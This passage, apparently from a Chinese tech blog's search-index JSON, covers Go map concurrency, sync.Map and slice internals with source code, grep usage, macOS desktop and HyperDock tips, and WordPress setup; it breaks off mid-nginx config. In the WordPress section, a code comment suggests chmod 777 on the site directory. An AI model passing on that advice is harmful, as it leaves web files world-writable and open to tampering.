对同一个map进行读写操作是不安全的。举个栗子：\n\n某map桶数量为4，即B=2。此时  goroutine1来插入key1， goroutine2来读取 key2. 可能会发生如下过程：\n\n① goroutine2 计算key2的hash值,B=2，并确定桶号为1。\n\n② goroutine1添加key1，触发扩容条件。\n\n③ B=B+1=3, buckets数据迁移到oldbuckets。\n\n④ goroutine2从桶1中遍历，获取数据失败。\n\n在工作中，当我们涉及到对一个map进行并发读写时，一般采用的做法是采用golang中自带的mutex锁。\n\n### 3.3 遍历无序\n\nmap 在扩容后，会发生 key 的搬迁，原来落在同一个 bucket 中的 key，搬迁后，有些 key 就要远走高飞了（bucket 序号加上了 2^B）。而遍历的过程，就是按顺序遍历 bucket，同时按顺序遍历 bucket 中的 key。搬迁后，key 的位置发生了重大的变化，有些 key 飞上高枝，有些 key 则原地不动。这样，遍历 map 的结果就不可能按原来的顺序了。\n\ngolang为了让程序员不依赖这种不可靠的保证，就干脆遍历的时候加入随机数，然后不管什么时候遍历，顺序都是不保证的。\n\n### 3.4 头脑风暴\n\n+ hmap（hashmap）维护一个桶数组，数组的每个元素是一个bmap。\n+ 每个桶有 8个kv 对，多了就用增加一个溢出桶。bmap存着key value，和下一个溢出桶的地址。\n+ 基本数据结构是 hash数组+桶内的key-value数组+溢出的桶链表。\n+ 扩容有可能会迁移桶。\n\n# 4. 参考资料\n\n+ https://juejin.cn/post/7029679896183963678\n+ https://segmentfault.com/a/1190000039101378\n","tags":["golang"],"categories":["2_golang底层"]},{"title":"golang的sync.Map实现原理","url":"%2Fp%2F22d609c9.html","content":"\nmap的读写删除都不是原子操作，因此需要控制并发访问，而Go的原生map不支持并发读写；\n\nGo在1.9的版本中新增了sync.Map的数据结构，两个map实现 读写分离，适用于读多写少的场景。\n\n<!-- more -->\n\n# 1. 介绍\n\n```go\nvar syncMap sync.Map\n\n// 添加数据\nsyncMap.Store(1, \"test-1\")\nsyncMap.Store(2, \"test-2\")\nsyncMap.Store(3, \"test-3\")\n\n// 读取数据\nv, ok := syncMap.Load(1)\nif !ok {\n        fmt.Println(\"数据不存在\")\n        return\n}\nfmt.Println(v)\n\n// LoadOrStore方法用于不存在则添加，存在则返回\nfmt.Println(syncMap.LoadOrStore(1, \"www.liuvv.com\"))\n\n// 删除数据\nsyncMap.Delete(1)\n\n// 循环遍历读取数据获取长度\nlen := 0\nsyncMap.Range(func(k, v interface{}) bool {\n        len++\n        fmt.Println(k, v)\n        return true\n})\nfmt.Println(\"syncMap长度:\", len)\n```\n\n### 1.1 原理\n\nsync.Map底层使用了两个原生map，一个叫read，仅用于读；一个叫dirty，用于在特定情况下存储最新写入的key-value数据。\n\n<img src=\"golang的sync_map实现原理/1cc2d5ec1bc8422a9fdc912ba5a69d66.png\" alt=\"在这里插入图片描述\" style=\"zoom: 33%;\" />\n\n**sync.Map 的实现原理可概括为：**\n\n1. 通过 read 和 dirty 两个字段实现数据的读写分离，读的数据存在只读字段 read 上，将最新写入的数据则存在 dirty 字段上。\n2. 读取时会先查询 read，不存在再查询 dirty，写入时则只写入 dirty。\n3. 读取 read 并不需要加锁，而读或写 dirty 则需要加锁。\n4. 另外有 misses 字段来统计 read 被穿透的次数（被穿透指需要读 dirty 的情况），超过一定次数则将 dirty 数据更新到 read 中（触发条件：misses=len(dirty)）\n\n![在这里插入图片描述](golang的sync_map实现原理/a98832789cd34c9db0cc1facf134deb1.png)\n\n### 1.2 优缺点\n\n- 优点：Go官方所出；通过读写分离，降低锁时间来提高效率；\n- 缺点：不适用于大量写的场景，这样会导致 read map 读不到数据而进一步加锁读取，同时dirty map也会一直晋升为read map，整体性能较差，甚至没有单纯的 map+metux高。\n- 适用场景：读多写少的场景。\n\n# 2. 源码分析\n\n### 2.1 数据结构\n\n```go\n// sync.Map的核心数据结构\ntype Map struct {\n    mu Mutex                          // 对 dirty 加锁保护，线程安全\n    read atomic.Value                 // readOnly 只读的 map，充当缓存层\n    dirty map[interface{}]*entry     // 负责写操作的 map，当misses = len(dirty)时，将其赋值给read\n    misses int                        // 未命中 read 时的累加计数，每次+1\n}\n\n// 上面read字段的数据结构\ntype readOnly struct {\n    m  map[interface{}]*entry \n    amended bool // Map.dirty的数据和这里read中 m 的数据不一样时，为true\n}\n\n// 上面m字段中的entry类型\ntype entry struct {\n    // 可见value是个指针类型，虽然read和dirty存在冗余情况（amended=false），但是由于是指针类型，存储的空间应该不是问题\n    p unsafe.Pointer // *interface{}\n}\n```\n\n### 2.2 load 操作\n\n```go\nfunc (m *Map) Load(key interface{}) (value interface{}, ok bool) {\n    // 因read只读，线程安全，优先读取\n    read, _ := m.read.Load().(readOnly)\n    e, ok := read.m[key]\n    \n    // 如果read没有，并且dirty有新数据，那么去dirty中查找（read.amended=true：dirty和read数据不一致）\n    if !ok && read.amended {\n        m.mu.Lock()\n        // 双重检查（原因是前文的if判断和加锁非原子的，害怕这中间发生故事）\n        read, _ = m.read.Load().(readOnly)\n        e, ok = read.m[key]\n        \n        // 如果read中还是不存在，并且dirty中有新数据\n        if !ok && read.amended {\n            e, ok = m.dirty[key]\n            // m计数+1\n            m.missLocked()\n        }\n        \n        m.mu.Unlock()\n    }\n    \n    // !ok && read.amended=false：dirty和read数据是一致的，read 和 dirty 中都不存在，返回nil\n    if !ok {\n        return nil, false\n    }\n    \n    // ok && read.amended=true：dirty和read数据不一致，dirty存在但read不存在该key，直接返回dirty中数据\n    return e.load()\n}\n\nfunc (m *Map) missLocked() {\n    m.misses++\n    if m.misses < len(m.dirty) {\n        return\n    }\n    \n    // 将dirty置给read，因为穿透概率太大了(原子操作，耗时很小)\n    m.read.Store(readOnly{m: m.dirty})\n    m.dirty = nil\n    m.misses = 0\n}\n\n```\n\n<img src=\"golang的sync_map实现原理/20f35453c3ed4212bc154ac440624464.png\" alt=\"在这里插入图片描述\" style=\"zoom:70%;\" />\n\n\n\n- 因为写操作仅针对dirty（负责写操作的map），所以dirty是包含read的，最新且全量的数据。\n\n### 2.3 store 操作\n\n```go\nfunc (m *Map) Store(key, value interface{}) {\n    // 如果m.read存在这个key，并且没有被标记删除，则尝试更新。\n    read, _ := m.read.Load().(readOnly)\n    if e, ok := read.m[key]; ok && e.tryStore(&value) {\n        return\n    }\n    \n    // 如果read不存在或者已经被标记删除\n    m.mu.Lock()\n    read, _ = m.read.Load().(readOnly)\n   \n    if e, ok := read.m[key]; ok { // read 存在该key\n    // 如果read值域中entry已删除且被标记为expunge，则表明dirty没有key，可添加入dirty，并更新entry\n        if e.unexpungeLocked() { \n            // 加入dirty中，这里是指针\n            m.dirty[key] = e\n        }\n        // 更新value值\n        e.storeLocked(&value) \n        \n    } else if e, ok := m.dirty[key]; ok { // dirty 存在该 key，更新\n        e.storeLocked(&value)\n        \n    } else { // read 和 dirty都没有\n        // 如果read与dirty相同，则触发一次dirty刷新（因为当read重置的时候，dirty已置为 nil了）\n        if !read.amended { \n            // 将read中未删除的数据加入到dirty中\n            m.dirtyLocked() \n            // amended标记为read与dirty不相同，因为后面即将加入新数据。\n            m.read.Store(readOnly{m: read.m, amended: true})\n        }\n        m.dirty[key] = newEntry(value) \n    }\n    m.mu.Unlock()\n}\n\n// 将read中未删除的数据加入到 dirty中\nfunc (m *Map) dirtyLocked() {\n    if m.dirty != nil {\n        return\n    }\n    \n    read, _ := m.read.Load().(readOnly)\n    m.dirty = make(map[interface{}]*entry, len(read.m))\n    \n    // 遍历read。\n    for k, e := range read.m {\n        // 通过此次操作，dirty中的元素都是未被删除的，可见标记为expunged的元素不在dirty中！！！\n        if !e.tryExpungeLocked() {\n            m.dirty[k] = e\n        }\n    }\n}\n\n// 判断entry是否被标记删除，并且将标记为nil的entry更新标记为expunge\nfunc (e *entry) tryExpungeLocked() (isExpunged bool) {\n    p := atomic.LoadPointer(&e.p)\n    \n    for p == nil {\n        // 将已经删除标记为nil的数据标记为expunged\n        if atomic.CompareAndSwapPointer(&e.p, nil, expunged) {\n            return true\n        }\n        p = atomic.LoadPointer(&e.p)\n    }\n    return p == expunged\n}\n\n// 对entry尝试更新 （原子cas操作）\nfunc (e *entry) tryStore(i *interface{}) bool {\n    p := atomic.LoadPointer(&e.p)\n    if p == expunged {\n        return false\n    }\n    for {\n        if atomic.CompareAndSwapPointer(&e.p, p, unsafe.Pointer(i)) {\n            return true\n        }\n        p = atomic.LoadPointer(&e.p)\n        if p == expunged {\n            return false\n        }\n    }\n}\n\n// read里 将标记为expunge的更新为nil\nfunc (e *entry) unexpungeLocked() (wasExpunged bool) {\n    return atomic.CompareAndSwapPointer(&e.p, expunged, nil)\n}\n\n// 更新entry\nfunc (e *entry) storeLocked(i *interface{}) {\n    atomic.StorePointer(&e.p, unsafe.Pointer(i))\n}\n```\n\n<img src=\"golang的sync_map实现原理/9582a20c2f0146c8ad42df8d989f085b.png\" alt=\"在这里插入图片描述\" style=\"zoom:70%;\" />\n\n### 2.4 delete 操作\n\n```go\nfunc (m *Map) Delete(key interface{}) {\n    // 读出read，断言为readOnly类型\n    read, _ := m.read.Load().(readOnly)\n    e, ok := read.m[key]\n    // 如果read中没有，并且dirty中有新元素，那么就去dirty中去找。这里用到了amended，当read与dirty不同时为true，说明dirty中有read没有的数据。\n    \n    if !ok && read.amended {\n        m.mu.Lock()\n        // 再检查一次，因为前文的判断和锁不是原子操作，防止期间发生了变化。\n        read, _ = m.read.Load().(readOnly)\n        e, ok = read.m[key]\n        \n        if !ok && read.amended {\n            // 直接删除\n            delete(m.dirty, key)\n        }\n        m.mu.Unlock()\n    }\n    \n    if ok {\n    // 如果read中存在该key，则将该value 赋值nil（采用标记的方式删除！）\n        e.delete()\n    }\n}\n\nfunc (e *entry) delete() (hadValue bool) {\n    for {\n        // 再次加载数据的指针，如果指针为空或已被标记删除，那么返回false，删除失败\n        p := atomic.LoadPointer(&e.p)\n        if p == nil || p == expunged {\n            return false\n        }\n        \n        // 原子操作\n        if atomic.CompareAndSwapPointer(&e.p, p, nil) {\n            return true\n        }\n    }\n}\n```\n\n<img src=\"golang的sync_map实现原理/0327370848ef4d648b19d1209bf4d160.png\" alt=\"在这里插入图片描述\" style=\"zoom:70%;\" />\n\n\n\n通过阅读源码我们发现sync.Map是通过冗余的两个数据结构(read、dirty),实现性能的提升。\n\n为了提升性能，load、delete、store等操作尽量使用只读的read；为了提高read的key击中概率，采用动态调整，将dirty数据提升为read；对于数据的删除，采用延迟标记删除法，只有在提升dirty的时候才删除。\n\n# 3. 参考资料\n\n+ https://cloud.tencent.com/developer/article/1918426\n+ https://developer.aliyun.com/article/1172753\n","tags":["golang"],"categories":["2_golang底层"]},{"title":"golang的slice实现原理","url":"%2Fp%2Fc35a2107.html","content":"\nslice 切片，也可以理解为动态数组。与数组相比切片的长度是不固定的，可以追加元素，在追加时可能使切片的容量增大。\n\n<!-- more -->\n\n# 1. 介绍\n\n### 1.1 数据结构\n\n```go\ntype SliceHeader struct {\n\tData uintptr\n\tLen  int\n\tCap  int\n}\n```\n\n- `Data` 是指向数组的指针;\n- `Len` 是当前切片的长度；\n- `Cap` 是当前切片的容量，即 `Data` 数组的大小：\n\n![golang-slice-struct](golang的slice实现原理/1.png)\n\n\n\n### 1.2 初始化\n\n##### 1. make\n\n```go\nslice := make([]int, 10)\n```\n\n创建切片的运行时函数 [`runtime.makeslice`]主要工作是计算切片占用的内存空间并在堆上申请一片连续的内存，它使用如下的方式计算占用的内存：\n\n内存空间 = 切片中元素大小 × 切片容量\n\n```go\nfunc makeslice(et *_type, len, cap int) unsafe.Pointer {\n\tmem, overflow := math.MulUintptr(et.size, uintptr(cap))\n\tif overflow || mem > maxAlloc || len < 0 || len > cap {\n\t\tmem, overflow := math.MulUintptr(et.size, uintptr(len))\n\t\tif overflow || mem > maxAlloc || len < 0 {\n\t\t\tpanicmakeslicelen()\n\t\t}\n\t\tpanicmakeslicecap()\n\t}\n\n\treturn mallocgc(mem, et, true)\n}\n```\n\n##### 2. 字面量初始化\n\n```go\nslice := []int{1, 2, 3}\n```\n\n当我们使用字面量 `[]int{1, 2, 3}` 创建新的切片时, 还是会创建一个数组, 然后通过 `[:]` 操作获取一个底层切片.\n\n##### 3. 下标范围\n\n```go\narr[0:3]\n```\n\n使用下标初始化切片不会拷贝原数组或者原切片中的数据，它只会创建一个指向原数组的切片结构体，所以修改新切片的数据也会修改原切片。\n\n```go\nfunc main() {\n\tarr1 := []int{1, 2, 3, 4, 5}\n\tarr2 := arr1[1:3]\n\tfmt.Println(arr1, arr2)\n\tarr2[0] = 100\n\tfmt.Println(arr1, arr2)\n}\n\n/*\n[1 2 3 4 5] [2 3]\n[1 100 3 4 5] [100 3]\n*/\n```\n\n# 2. 使用过程\n\n### 2.1 不同初始化方式\n\n```go\nslice := []int{0, 1, 2, 3, 4, 5, 6, 7, 8, 9}\ns1 := slice[2:5]   // 2,3,4\ns2 := s1[2:6:7] \t // data[low, high, max]  4,5,6,7\n```\n\n<img src=\"golang%E7%9A%84slice%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/3.png\" alt=\"slice origin\" style=\"zoom:30%;\" />\n\n### 2.2 修改引用\n\n接着，向 `s2` 尾部追加一个元素 100：\n\n```go\ns2 = append(s2, 100)\n```\n\n`s2` 容量刚好够，直接追加。不过，这会修改原始数组对应位置的元素。这一改动，数组和 `s1` 都可以看得到。\n\n<img src=\"golang%E7%9A%84slice%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/2.png\" alt=\"append 100\" style=\"zoom:30%;\" />\n\n### 2.3 扩容拷贝\n\n再次向 `s2` 追加元素200：\n\n```go\ns2 = append(s2, 200)\n```\n\n这时，`s2` 的容量不够用，该扩容了。于是，`s2` 另起炉灶，将原来的元素复制新的位置，扩大自己的容量。\n\n并且为了应对未来可能的 `append` 带来的再一次扩容，`s2` 会在此次扩容的时候多留一些 `buffer`，将新的容量将扩大为原始容量的2倍，也就是10了。\n\n<img src=\"golang%E7%9A%84slice%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/5.png\" alt=\"append 200\" style=\"zoom:30%;\" />\n\n### 4.4 修改其他引用\n\n最后，修改 `s1` 索引为2位置的元素：\n\n```\ns1[2] = 20\n```\n\n这次只会影响原始数组相应位置的元素。它影响不到 `s2` 了，人家已经远走高飞了。\n\n<img src=\"golang%E7%9A%84slice%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/4.png\" alt=\"s1[2]=20\" style=\"zoom:30%;\" />\n\n再提一点，打印 `s1` 的时候，只会打印出 `s1` 长度以内的元素。所以，只会打印出3个元素，虽然它的底层数组不止3个元素。\n\n# 3. 扩容机制\n\n### 3.1 源代码\n\n```go\nfunc growslice(et *_type, old slice, cap int) slice {\n\tnewcap := old.cap\n\tdoublecap := newcap + newcap\n\tif cap > doublecap {\n\t\tnewcap = cap\n\t} else {\n\t\tif old.len < 1024 {\n\t\t\tnewcap = doublecap\n\t\t} else {\n\t\t\tfor 0 < newcap && newcap < cap {\n\t\t\t\tnewcap += newcap / 4\n\t\t\t}\n\t\t\tif newcap <= 0 {\n\t\t\t\tnewcap = cap\n\t\t\t}\n\t\t}\n\t}\n```\n\n\n\n+ 如果期望容量大于当前容量的两倍就会使用期望容量；\n\n+ 如果当前切片的长度小于 1024 就会将容量翻倍；\n\n+ 如果当前切片的长度大于 1024 就会每次增加 25% 的容量，直到新容量大于期望容量；\n\n### 3.2 cap不足重新分配\n\n下面这个例子底层用的同一个数组, cap充足没有重新分配新数组\n\n```go\nfunc main() {\n\tm := make([]int, 3, 4)\n\ta := append(m, 1)\n\tb := append(m, 2)\n\tfmt.Printf(\"m: %v p:%p\\n\", m, m)  // m: [0 0 0]   p:0xc00008a000\n\tfmt.Printf(\"a: %v p:%p\\n\", a, a)  // a: [0 0 0 2] p:0xc00008a000\n\tfmt.Printf(\"b: %v p:%p\\n\", b, b)  // b: [0 0 0 2] p:0xc00008a000\n  \n  a[0] = 10\n\tb[0] = 100\n  fmt.Printf(\"m: %v p:%p\\n\", m, m)  // m: [100 0 0]   p:0xc00008a000\n\tfmt.Printf(\"a: %v p:%p\\n\", a, a)  // a: [100 0 0 2] p:0xc00008a000\n\tfmt.Printf(\"b: %v p:%p\\n\", b, b)  // b: [100 0 0 2] p:0xc00008a000\n}\n\n```\n\n下面这个例子, 底层用了两个数组, b扩容的时候, cap不足另起炉灶了。\n\n```go\nfunc main() {\n\tm := make([]int, 3, 4)\n\ta := append(m, 1)\n\tb := append(a, 2)\n\tfmt.Printf(\"m: %v p:%p\\n\", m, m)  // m: [0 0 0]     p:0xc000018220\n\tfmt.Printf(\"a: %v p:%p\\n\", a, a)  // a: [0 0 0 1]   p:0xc000018220\n\tfmt.Printf(\"b: %v p:%p\\n\", b, b)  // b: [0 0 0 1 2] p:0xc00001c180\n  \n  a[0] = 10\n\tb[0] = 100\n\tfmt.Printf(\"m: %v p:%p\\n\", m, m)  // m: [10 0 0]      p:0xc000018220\n\tfmt.Printf(\"a: %v p:%p\\n\", a, a)  // a: [10 0 0 1]    p:0xc000018220\n\tfmt.Printf(\"b: %v p:%p\\n\", b, b)  // b: [100 0 0 1 2] p:0xc00001c180\n}\n```\n\n### 3.3 扩容时底层ptr指向新的地址\n\n\n```go\nfunc main() {\n\tss := []int{}\n\tfor i := 1; i < 20; i++ {\n\t\tfmt.Printf(\"addr:%p %p,len:%d,cap:%d\\n\", ss, &ss, len(ss), cap(ss))\n\t\tss = append(ss, i)\n\t}\n}\n\n/*\naddr:0x11aac78    0xc0000a6020,len:0,cap:0\n\naddr:0xc0000b4020 0xc0000a6020,len:1,cap:1\n\naddr:0xc0000b4040 0xc0000a6020,len:2,cap:2\n\naddr:0xc0000b6020 0xc0000a6020,len:3,cap:4\naddr:0xc0000b6020 0xc0000a6020,len:4,cap:4\n\naddr:0xc0000b8040 0xc0000a6020,len:5,cap:8\naddr:0xc0000b8040 0xc0000a6020,len:6,cap:8\naddr:0xc0000b8040 0xc0000a6020,len:7,cap:8\naddr:0xc0000b8040 0xc0000a6020,len:8,cap:8\n\naddr:0xc0000ba000 0xc0000a6020,len:9,cap:16\naddr:0xc0000ba000 0xc0000a6020,len:10,cap:16\naddr:0xc0000ba000 0xc0000a6020,len:11,cap:16\naddr:0xc0000ba000 0xc0000a6020,len:12,cap:16\naddr:0xc0000ba000 0xc0000a6020,len:13,cap:16\naddr:0xc0000ba000 0xc0000a6020,len:14,cap:16\naddr:0xc0000ba000 0xc0000a6020,len:15,cap:16\naddr:0xc0000ba000 0xc0000a6020,len:16,cap:16\n\naddr:0xc0000bc000 0xc0000a6020,len:17,cap:32\naddr:0xc0000bc000 0xc0000a6020,len:18,cap:32\n\n*/\n```\n\n+ 可以看出, cap 是2倍增长的(<1024)\n\n+ 当cap变化的时候，ss 的指针变了。\n+ &ss 的指针没有变，因为 &ss操作返回的是该切片的内部指针地址。\n\n# 4. 参考资料\n\n+ https://www.cnblogs.com/qcrao-2018/p/10631989.html\n","tags":["golang"],"categories":["2_golang底层"]},{"title":"grep命令的使用介绍","url":"%2Fp%2F6dc03659.html","content":"\ngrep是Linux中最常用的”文本处理工具”之一，grep与sed、awk合称为Linux中的三剑客。\n\n我们可以使用grep命令在文本中查找指定的字符串，就像打开txt文件，使用 “Ctrl+F” 在文本中查找某个字符串一样，说白了，可以把grep理解成字符查找工具。\n\n<!-- more -->\n\n# 1. 介绍\n\ngrep的全称为： **G**lobal search **R**egular **E**xpression and **P**rint out the line, 表示全局正则表达式版本，它的使用权限是所有用户。\n\n`grep`的工作方式是这样的，它在一个或多个文件中搜索字符串模板。如果模板包括空格，则必须被引用，模板后的所有字符串被看作文件名。搜索的结果被送到标准输出，不影响原文件内容。\n\n### 1.1 实例\n\n```bash\n# 查找指定进程\nps -ef|grep python \n\n# 查找指定进程个数\nps -ef|grep -c python\n\n# 从文件中查找关键词\ngrep 'linux' file1.txt\n\n# 找出已w开头的行内容\ncat file1.txt |grep ^w\n\n# 找出非w开头的行内容\ncat file2.txt |grep ^[^w]\n\n# 输出以hat结尾的行内容\ncat test.txt |grep hat$\n\n# 在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件\ngrep test *file \n\n# 以递归的方式查找指定目录/etc/acpi 及其子目录（如果存在子目录的话）下所有文件中包含字符串\"update\"的文件\ngrep -r update /etc/acpi \n```\n\n\n\n# 2. 使用\n\ncat a.txt, 以下面的文件为测试文件\n\n```txt\ntest\na\nb\nc\nd\ne\nf\ng\ntest1\nTEST2\n```\n\n\n\n### 2.1 基础搜索\n\n我们先来一个最基础的搜索:\n\n```bash\ngrep \"test\" a.txt\n\ntest\ntest1\n```\n\n\n\n如果我们想要在搜索字符串的时候，不区分大小写，应该怎样做呢？grep很贴心，为我们准备了一个选项，使用”-i”选项，即可在搜索时不区分大小写，示例如下：\n\n```bash\ngrep -i \"test\" a.txt\n\ntest\ntest1\nTEST2\n```\n\n\n\n我们还想要知道哪行文本包含”test”字符串，则可以使用”-n”选项，表示显示打印出的行在文本中的行号，示例如下\n\n```bash\ngrep -in \"test\" a.txt\n\n1:test\n9:test1\n10:TEST2\n```\n\n\n\n被匹配到的关键字没有高亮显示，如果我们想要高亮显示行中的关键字，该怎么办呢？我们可以使用”–color”选项，高亮显示行中的关键字，示例如下\n\n```bash\ngrep -in --color \"test\" a.txt\n\n# 其实结果一样, 因为在 mac 下, grep 已经是别名, 我们可以输出一下\n\nalias grep\ngrep='grep --color=auto --exclude-dir={.bzr,CVS,.git,.hg,.svn,.idea,.tox}'\n```\n\n\n\n如果我们只想知道有多少行包含指定的字符串，而不在乎哪些行包含这些字符串，我们可以使用-c，获取到符合条件的总行数。\n\n```bash\ngrep -ic \"test\" a.txt\n\n3\n```\n\n\n\n如果我们只想看被匹配到的关键字，不想整行都被打印出来，可以吗？必须的，使用”-o”选项即可只打印出匹配到的关机字，而不打印出整行，示例如下。\n\n```bash\ngrep -ino \"test\" a.txt\n\n1:test\n9:test\n10:TEST\n```\n\n但是需要注意，”-o”选项会把每个匹配到的关键字都单独显示在一行中进行输出(即一行有2个匹配会输出两行)\n\n\n\n如果我们搜索内容, 但结果只想展示文件名, 可以用`-l`选项\n\n```bash\ngrep -l \"test\" a.txt\n\na.txt\n```\n\n\n\n如果我们想搜索文件的名字(注意不是内容), 需要用到 `find`指令\n\n``` bash\nfind <path> -name *FileName*\n```\n\n\n\n### 2.2 高级搜索\n\n我们在使用grep命令搜索文本时，往往有这种需求：在找到对应的关键字时，同时需要显示关键字附近的信息\n\n 例如我们先找字母c\n\n```bash\ngrep -in \"c\" a.txt\n\n4:c\n```\n\n不仅找字母 c, 还找附近的行, 我们可以使用”-B”选项，显示符合条件的行之前的行，”B”有before之意，示例如下\n\n```bash\ngrep -in -B 3 \"c\" a.txt\n\n1-test\n2-a\n3-b\n4:c\n```\n\n与”-B”选项对应的选项是”-A”选项，”-B”有Before之意，”-A”有After之意，聪明如你，一定已经猜到了”-A”的含义，没错，”-A”代表显示符合条件的行的同时，还要显示之后的行，”-A3″表示同时显示符合条件的行之后的3行。\n\n\n\n说了”-A”，说了”-B”，现在说说”-C”，”-C”选项可以理解为”-A与-B”的结合，”-C”选项表示在显示符合条件的行的同时，也会显示其前后的行，如”-C1″，”-C1″表示打印符合条件的行的同时，也打印出之前的一行与之后的一行，”-C”有Context之意（上下文之意），示例如下。\n\n```bash\ngrep -in -C 3 \"c\" a.txt\n\n1-test\n2-a\n3-b\n4:c\n5-d\n6-e\n7-f\n```\n\n\n\n精确匹配，就是”test”作为一个独立的单词存在，而不是包含于某个字符串中，那么，如果有这种需求，我们怎么办呢？使用”-w”选项可以实现我们的需求，示例如下。\n\n```bash\ngrep -inw test a.txt #”-w”有word之意，表示搜索的字符串作为一个独立的单词时才会被匹配到。\n\n1:test\n```\n\n有的时候，我们需要反向查找，比如，查找”不包含某个字符串”的行，这个时候，我们需要用到”-v”选项，示例如下。\n\n```bash\ngrep -iv test a.txt\n\na\nb\nc\nd\ne\nf\ng\n```\n\n\n\n我们也可以同时在文本中搜索了”a”字符串与”b”字符串，包含这两个字符串中任意一个的行都会被打印出来，没错，就像上图中的示例一样，使用”-e”选项可以同时匹配多个目标，多个目标之间存在”或”关系，即匹配其中的任意一个都算作匹配成功\n\n```bash\ngrep -ie a -ie b a.txt\n\na\nb\n```\n\n\n\n### 2.3 正则搜索\n\n在使用”-E”选项时，grep才支持”扩展正则表达式”，不使用”-E”选项时，grep默认只支持”基本正则表达式”。\n我们在使用grep时，可以使用”-P”选项，指明使用perl兼容的正则表达式。\n\n```bash\ngrep -iE \"a|b\" a.txt\n\na\nb\n```\n\n其实，除了grep命令，其实还有egrep命令，还有fgrep命令（fast grep），它们有各自的特点。\ngrep：支持基本正则表达式\negrep：支持扩展正则表达式，相当于grep -E\nfgrep：不支持正则表达式，只能匹配写死的字符串，但是速度奇快，效率高，fastgrep\n\n\n\n### 2.4 总结\n\n-i：在搜索的时候忽略大小写\n-n：显示结果所在行号\n-c：统计匹配到的行数，注意，是匹配到的总行数，不是匹配到的次数\n-o：只显示符合条件的字符串，但是不整行显示，每个符合条件的字符串单独显示一行\n-v：输出不带关键字的行（反向查询，反向匹配）\n-w：匹配整个单词，如果是字符串中包含这个单词，则不作匹配\n-Ax：在输出的时候包含结果所在行之后的指定行数，这里指之后的x行，A：after\n-Bx：在输出的时候包含结果所在行之前的指定行数，这里指之前的x行，B：before\n-Cx：在输出的时候包含结果所在行之前和之后的指定行数，这里指之前和之后的x行，C：context\n-e：实现多个选项的匹配，逻辑or关系\n-P：表示使用兼容perl的正则引擎。\n-E：使用扩展正则表达式，而不是基本正则表达式，在使用”-E”选项时，相当于使用egrep。\n-l :   搜索结果只显示文件名\n\n\n# 3. 参考资料\n\n+ https://www.zsythink.net/archives/1733\n+ https://www.yiibai.com/linux/grep.html","tags":["linux"],"categories":["命令"]},{"title":"mac多桌面管理和hyperdock","url":"%2Fp%2Fa0f6fb88.html","content":"\n# 1. mac多桌面\n\n我认为mac多桌面主要是为了更好地利用**一个应用的多个窗口**。\n\n我正在工作中，偶尔需要上网查一些资料，这些资料分为 A 类和 B 类，分别有若干网页，为了不把它们弄混，我用了两个窗口来装不同资料的网页，使用 Cmd+` 在两个窗口间切换。\n\n不同桌面的目的是为了形成「不同的氛围」：工作的时候不要想娱乐，娱乐的时候也不要想工作，一段时间做好一件事就可以了。\n\n<!-- more -->\n\nmac下快捷键设置在系统设置->keyboard->shortcuts->mission Control中\n\n<img src=\"mac多桌面管理和hyperdock/0.png\" alt=\"1\" style=\"zoom:50%;\" />\n\n\n\n### 1.1 基本操作\n\n+ ctrl + 上箭头  桌面管理\n\n+ ctrl + 左右箭头  切换桌面\n+ 在触控板上四指左右滑动，也可按顺序切换桌面\n\n### 1.2 固定桌面顺序\n\n当 Mac 打开多个桌面的时候，系统会自动根据用户的使用情况进行排序。比如：我在 桌面1 触发了 桌面3 的应用，这个时候 桌面3 就会和 桌面2 互换位置。\n\n这是因为 Mac 默认设置根据最近的使用情况自动重新排列空间。\n\n<img src=\"mac多桌面管理和hyperdock/1.png\" alt=\"1\" style=\"zoom:50%;\" />\n\n取消勾选 根据最近的使用情况自动重新排列空间。\n\n### 1.3 移动程序到另一个桌面\n\n+ 打开Mission Control，拖到上方显示的桌面里去。\n\n+ 鼠标**按住**标题栏，用^1、^2等（需要在系统偏好设置开启）\n\n  \n### 1.4 显示桌面序号\n\nhttps://github.com/gechr/WhichSpace/\n\n\n\n# 2. hyperdock\n\n### 2.1 使用\n\n+ 可以设置延迟等属性\n\n<img src=\"mac多桌面管理和hyperdock/3.png\" alt=\"1\" style=\"zoom:50%;\" />\n\n+ 主题选择黑色模式, 另外可以确定软件是否生效\n\n<img src=\"mac多桌面管理和hyperdock/4.png\" alt=\"1\" style=\"zoom:50%;\" />\n\n### 2.2 转移桌面\n\n如果想把窗口转到特定的桌面，不用再费力的拖拽了，只要把鼠标悬停在小窗口上，然后按数字键就会将指定窗口转到对应该数字编号的桌面了。\n\n对于鼠标也有特定的效果，当在小窗口上向下滚动滚轮就会把该窗口最小化，向上滚动则将窗口转到当面转到当前桌面显示。\n\n\n\n### 2.3 新建窗口和关闭窗口\n\n当把鼠标悬停在预览小窗口，然后按字母键就会有不同的效果产生。\n\n+ n 新建\n+ w 关闭\n+ l 左边\n+ r 右边\n\n\n\n### 2.4 最小化为应用图标\n\n当你打开了一个程序后，最小化该程序后，会统一缩小在程序坞底部右侧部分，如下图黄线包着部分所示\n\n![1](mac多桌面管理和hyperdock/2.png)\n\n\n点击「系统偏好设置」，选择「程序坞」，然后勾选「将窗口最小化为应用程序图标」即可\n\n使用`hyperdock`建议勾选最小化为应用图标，使用更佳。\n\n\n\n\n# 3. 参考资料\n\n+ https://www.cnblogs.com/ider/p/let-mac-window-fly-with-hyperdock.html\n+ https://macwk.com/soft/hyperdock\n","tags":["mac"],"categories":["使用"]},{"title":"wordpress配置技巧","url":"%2Fp%2F311b7b94.html","content":"\n# 1. 安装插件需要ftp\n\nWordpress安装主题或者插件的时候会遇到需要输入FTP的情况，这种情况是由于网站目录权限引起的。\n\n<!-- more -->\n\n1. 在wp-config.php文件添加以下代码：\n\n```bash\ndefine('FS_METHOD','direct');\n```\n\n2. 修改wp安装目录权限\n\n```bash\nchmod -R 755 /var/www/wordpress/\nchown -R nobody:nobody /var/www/wordpress/  # 不知道用户可以把目录权限改成777\n```\n\n\n\n# 2. 配置 https\n\n\n1. 使用腾讯云免费1年的证书(域名)\n\n2. 配置 nginx\n\n   ```nginx\n   server {\n       listen 80;\n       listen [::]:80;\n       server_name httprun.com www.httprun.com;\n       return 301 https://www.httprun.com$request_uri;\n   }\n   \n   \n   server {\n     listen 443;\n     listen [::]:443;\n     server_name httprun.com www.httprun.com;\n   \n     ssl on;\n     